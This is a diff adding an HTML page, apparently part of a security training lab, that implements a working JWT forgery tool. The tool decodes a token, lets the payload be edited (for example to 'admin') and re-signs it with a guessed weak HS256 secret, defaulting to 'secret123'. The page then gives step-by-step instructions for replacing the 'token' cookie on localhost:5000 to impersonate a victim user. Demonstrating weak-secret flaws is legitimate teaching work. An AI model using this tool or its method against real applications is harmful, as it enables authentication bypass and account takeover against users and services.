@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JWT Forgery Tool - Security Misconfiguration Demo</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #d32f2f;
+            margin-bottom: 10px;
+        }
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        .section {
+            margin: 25px 0;
+            padding: 20px;
+            background: #f9f9f9;
+            border-radius: 5px;
+        }
+        label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 8px;
+            color: #333;
+        }
+        textarea, input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            box-sizing: border-box;
+        }
+        textarea {
+            min-height: 100px;
+            resize: vertical;
+        }
+        button {
+            background: #1976d2;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px 5px 10px 0;
+        }
+        button:hover {
+            background: #1565c0;
+        }
+        button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        .success {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            color: #155724;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 15px;
+        }
+        .error {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 15px;
+        }
+        .decoded {
+            background: #e3f2fd;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
+        pre {
+            background: #263238;
+            color: #aed581;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        .step-number {
+            background: #1976d2;
+            color: white;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+        .step-title {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1> JWT Forgery Tool</h1>
+        <p><strong>Security Misconfiguration Demonstration</strong></p>
+
+        <div class="warning">
+            <strong> Educational Purpose Only</strong><br>
+            This tool demonstrates how weak JWT secret keys allow attackers to forge authentication tokens.
+            Use only for authorized security testing and educational purposes.
+        </div>
+
+        <!-- Step 1: Decode -->
+        <div class="section">
+            <div class="step-title">
+                <span class="step-number">1</span>
+                <h3 style="margin: 0;">Decode Original Token</h3>
+            </div>
+            <label for="originalToken">Paste JWT Token from LocalStorage:</label>
+            <textarea id="originalToken" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."></textarea>
+            <button onclick="decodeToken()">Decode Token</button>
+            <div id="decodedOutput"></div>
+        </div>
+
+        <!-- Step 2: Modify -->
+        <div class="section">
+            <div class="step-title">
+                <span class="step-number">2</span>
+                <h3 style="margin: 0;">Modify Payload</h3>
+            </div>
+            <label for="payloadEditor">Edit JWT Payload (JSON):</label>
+            <textarea id="payloadEditor" placeholder='{"username": "admin", "exp": 1234567890, ...}'></textarea>
+        </div>
+
+        <!-- Step 3: Forge -->
+        <div class="section">
+            <div class="step-title">
+                <span class="step-number">3</span>
+                <h3 style="margin: 0;">Forge New Token</h3>
+            </div>
+            <label for="secretKey">JWT Secret Key (default: secret123):</label>
+            <input type="text" id="secretKey" value="secret123">
+            <button onclick="forgeToken()">Forge Token with New Payload</button>
+            <div id="forgedOutput"></div>
+        </div>
+
+        <!-- Step 4: Use -->
+        <div class="section">
+            <div class="step-title">
+                <span class="step-number">4</span>
+                <h3 style="margin: 0;">Use Forged Token</h3>
+            </div>
+            <p>Copy the forged token above and replace the authentication cookie:</p>
+            <ol>
+                <li>Open browser DevTools (F12) → <strong>Storage</strong> tab (Firefox) or <strong>Application</strong> tab (Chrome)</li>
+                <li>Click on <strong>Cookies</strong> → <code>http://localhost:5000</code></li>
+                <li>Find the cookie named <code>token</code> (NOT LocalStorage)</li>
+                <li>Double-click the <strong>Value</strong> column and replace with your forged token</li>
+                <li>Press Enter to save</li>
+                <li>Refresh the page (F5) - you're now authenticated as the victim user!</li>
+            </ol>
+            <p style="margin-top: 15px; padding: 10px; background: #fff3cd; border-radius: 5px;">
+                <strong>Note:</strong> The server reads the JWT from the <code>token</code> cookie, not from LocalStorage.
+                You must replace the cookie value to impersonate another user.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // Base64URL encoding/decoding functions
+        function base64urlEncode(str) {
+            // Convert string to base64, then make it URL-safe
+            return btoa(str)
+                .replace(/\+/g, '-')
+                .replace(/\//g, '_')
+                .replace(/=/g, '');
+        }
+
+        function base64urlDecode(str) {
+            // Convert base64url back to regular base64
+            str = str.replace(/-/g, '+').replace(/_/g, '/');
+            // Add padding if needed
+            while (str.length % 4) {
+                str += '=';
+            }
+            return atob(str);
+        }
+
+        function decodeToken() {
+            const token = document.getElementById('originalToken').value.trim();
+            const output = document.getElementById('decodedOutput');
+
+            if (!token) {
+                output.innerHTML = '<div class="error">Please paste a JWT token</div>';
+                return;
+            }
+
+            try {
+                const parts = token.split('.');
+                if (parts.length !== 3) {
+                    throw new Error('Invalid JWT format - must have 3 parts separated by dots');
+                }
+
+                const header = JSON.parse(base64urlDecode(parts[0]));
+                const payload = JSON.parse(base64urlDecode(parts[1]));
+
+                // Display decoded token
+                output.innerHTML = `
+                    <div class="success">
+                        <strong>✓ Token Decoded Successfully</strong>
+                    </div>
+                    <div class="decoded">
+                        <strong>Header:</strong>
+                        <pre>${JSON.stringify(header, null, 2)}</pre>
+                        <strong>Payload:</strong>
+                        <pre>${JSON.stringify(payload, null, 2)}</pre>
+                    </div>
+                `;
+
+                // Populate payload editor
+                document.getElementById('payloadEditor').value = JSON.stringify(payload, null, 2);
+            } catch (error) {
+                output.innerHTML = `<div class="error"><strong>Decode Error:</strong> ${error.message}</div>`;
+            }
+        }
+
+        async function forgeToken() {
+            const payloadText = document.getElementById('payloadEditor').value.trim();
+            const secret = document.getElementById('secretKey').value.trim();
+            const output = document.getElementById('forgedOutput');
+
+            if (!payloadText) {
+                output.innerHTML = '<div class="error">Please decode a token first or enter payload JSON</div>';
+                return;
+            }
+
+            if (!secret) {
+                output.innerHTML = '<div class="error">Please enter a secret key</div>';
+                return;
+            }
+
+            try {
+                // Parse the modified payload
+                const payload = JSON.parse(payloadText);
+
+                // Create JWT header
+                const header = {
+                    "alg": "HS256",
+                    "typ": "JWT"
+                };
+
+                // Encode header and payload
+                const encodedHeader = base64urlEncode(JSON.stringify(header));
+                const encodedPayload = base64urlEncode(JSON.stringify(payload));
+                const signatureInput = encodedHeader + '.' + encodedPayload;
+
+                // Create signature using Web Crypto API
+                const encoder = new TextEncoder();
+                const keyData = encoder.encode(secret);
+                const dataToSign = encoder.encode(signatureInput);
+
+                // Import the secret key
+                const cryptoKey = await crypto.subtle.importKey(
+                    'raw',
+                    keyData,
+                    { name: 'HMAC', hash: 'SHA-256' },
+                    false,
+                    ['sign']
+                );
+
+                // Sign the data
+                const signatureBuffer = await crypto.subtle.sign(
+                    'HMAC',
+                    cryptoKey,
+                    dataToSign
+                );
+
+                // Convert signature to base64url
+                const signatureArray = Array.from(new Uint8Array(signatureBuffer));
+                const signatureBase64 = btoa(String.fromCharCode(...signatureArray));
+                const signatureBase64url = signatureBase64
+                    .replace(/\+/g, '-')
+                    .replace(/\//g, '_')
+                    .replace(/=/g, '');
+
+                // Combine to create final JWT
+                const forgedJWT = signatureInput + '.' + signatureBase64url;
+
+                // Display forged token
+                output.innerHTML = `
+                    <div class="success">
+                        <strong>✓ Token Forged Successfully!</strong>
+                    </div>
+                    <div class="decoded">
+                        <strong>Forged JWT Token:</strong>
+                        <pre style="user-select: all; cursor: pointer;" onclick="copyToClipboard(this.textContent.trim())">${forgedJWT}</pre>
+                        <small style="color: #666;">Click token to copy to clipboard</small>
+                    </div>
+                `;
+            } catch (error) {
+                output.innerHTML = `<div class="error"><strong>Forge Error:</strong> ${error.message}</div>`;
+            }
+        }
+
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                alert('Token copied to clipboard!');
+            }).catch(err => {
+                console.error('Copy failed:', err);
+                // Fallback: select the text
+                alert('Copy the selected text manually (Ctrl+C)');
+            });
+        }
+
+        console.log('JWT Forgery Tool loaded - using native Web Crypto API');
+    </script>
+</body>
+</html>
